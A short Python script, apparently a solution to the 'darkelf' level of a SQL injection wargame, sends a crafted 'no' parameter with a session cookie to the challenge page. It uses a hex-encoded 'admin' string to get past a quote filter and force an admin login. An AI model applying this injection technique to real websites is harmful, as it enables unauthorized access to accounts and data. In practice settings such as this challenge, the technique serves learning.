#!/usr/bin/python3

import requests
import re
from termcolor import colored
from bs4 import BeautifulSoup as bs
import sys, getopt

url = "https://los.rubiya.kr/chall/darkelf_c6a5ed64c4f6a7a5595c24977376136b.php"
parameter = 'no'
cookie = dict(PHPSESSID='lqjdocrtrts7s5gl84ruvmc5aa')

# Initially, I wanted to set id = admin but STRING needs to be encapuslated with quote mark ' or "
# So, Hexdecimal can be used to bypass this restriction.
# no= (True and False) F or T (id = True) hence, (id = True) will be applied.
sqli = "1 and 1=0 or id = 0x61646d696e"

query_url = "%s?%s=%s" % (url,parameter,sqli)

print(query_url)
http_request = requests.get(query_url,cookies=cookie)
response_text = bs(http_request.text,"html.parser").prettify()

print(response_text)